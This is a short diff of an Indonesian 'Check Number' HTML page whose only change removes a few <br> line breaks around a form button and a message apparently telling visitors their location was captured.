@@ -172,7 +172,7 @@ function showPosition(position) {
 				<button class="kirim" id="kirim" type="submit">Kirim</button></form>
 				
 				<p class="lastman" id="lastman">Selamat anda kena shadap location</p>
-				<br><br><br><br>	<br><br><br><br>	<br>
+				<br><br><br><br>	<br><br>
 				
 				<div class="bawah">
 						<p>Check Number, Copyright &copy; 2019</p>
